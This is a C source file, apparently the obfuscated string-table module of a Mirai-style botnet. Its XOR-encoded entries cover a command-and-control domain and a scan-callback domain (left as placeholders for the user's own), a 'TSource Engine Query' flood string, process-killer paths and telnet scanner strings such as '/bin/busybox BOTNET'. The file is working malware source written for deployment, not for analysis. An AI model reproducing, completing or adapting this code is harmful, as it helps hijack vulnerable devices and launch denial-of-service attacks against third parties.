#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_keys[] = {
    0x38f7f129, 0x4a2a6db, 0x3b608da0, 0x6c34dab4, 0x3a80f431, 0x2893473, 
    0x1988be99, 0x5f980e32, 0x54ae03d6, 0x120f2780, 0x4205ded8, 0x5eb4e0a6, 
    0x40cd53f6, 0x2e9c2a07, 0x365bfa9f, 0x7cf02ecb, 0x1a538d95, 0x7a079f4f, 
    0x12dfa90f, 0x6640d384
};

struct table_value table[TABLE_MAX_KEYS];

void table_init(void) {

    /* literally compile enc.c, give it your domain string, example: 'brokeskid.com' */
    add_entry(TABLE_CNC_DOMAIN, "\x1b\x1b\x1b", 3);

    /* scan domain */
    add_entry(TABLE_SCAN_CB_DOMAIN, "\x1b\x1b\x1b", 3);

    add_entry(TABLE_EXEC_SUCCESS, "\x5d\x55\x49\x52\x1a\x4e\x52\x5b\x4e\x1a\x59\x52\x53\x54\x5f\x49\x5f\x1a\x5c\x5b\x57\x53\x56\x43\x1a\x5b\x4e\x1a\x4e\x52\x5f\x1a\x55\x4e\x52\x5f\x48\x1a\x4e\x5b\x58\x56\x5f\x1a\x49\x4f\x48\x5f\x1a\x5b\x4e\x5f\x1a\x5b\x1a\x56\x55\x4e", 58);
    add_entry(TABLE_ATK_VSE, "\x6e\x69\x55\x4f\x48\x59\x5f\x1a\x7f\x54\x5d\x53\x54\x5f\x1a\x6b\x4f\x5f\x48\x43", 20);
    add_entry(TABLE_KILLER_PROC, "\x15\x4a\x48\x55\x59\x15", 6);
    add_entry(TABLE_KILLER_EXE, "\x15\x5f\x42\x5f", 4);
    add_entry(TABLE_KILLER_FD, "\x15\x5c\x5e", 3);
    add_entry(TABLE_KILLER_CMDLINE, "\x15\x59\x57\x5e\x56\x53\x54\x5f", 8);

    /* scanner */
    add_entry(TABLE_SCAN_ENABLE, "\x5f\x54\x5b\x58\x56\x5f", 6);
    add_entry(TABLE_SCAN_SYSTEM, "\x49\x43\x49\x4e\x5f\x57", 6);
    add_entry(TABLE_SCAN_SHELL, "\x49\x52\x5f\x56\x56", 5);
    add_entry(TABLE_SCAN_SH, "\x49\x52", 2);
    add_entry(TABLE_SCAN_QUERY, "\x15\x58\x53\x54\x15\x58\x4f\x49\x43\x58\x55\x42\x1a\x78\x75\x6e\x74\x7f\x6e", 19);
    add_entry(TABLE_SCAN_NCORRECT, "\x54\x59\x55\x48\x48\x5f\x59\x4e", 8);
    add_entry(TABLE_SCAN_RESP, "\x78\x75\x6e\x74\x7f\x6e\x0\x1a\x5b\x4a\x4a\x56\x5f\x4e\x1a\x54\x55\x4e\x1a\x5c\x55\x4f\x54\x5e", 24);
}

void table_unlock_val(uint8_t id) {
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked) {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id) {
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked) {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len) {
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked) {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len) {
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

/* lets make an epic obfuscator with 20 table keys because we're rich */
static void toggle_obf(uint8_t id) {
    struct table_value *val = &table[id];

    /* little cpu intensive gagagagaa */
    for (int i = 0; i < TABLE_KEY_LEN; i++) {

        uint32_t table_key = table_keys[i];

        uint8_t k1 = table_key & 0xff,
                k2 = (table_key >> 8) & 0xff,
                k3 = (table_key >> 16) & 0xff,
                k4 = (table_key >> 24) & 0xff;

        for (int i = 0; i < val->val_len; i++) {
            val->val[i] ^= k1;
            val->val[i] ^= k2;
            val->val[i] ^= k3;
            val->val[i] ^= k4;
        }
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
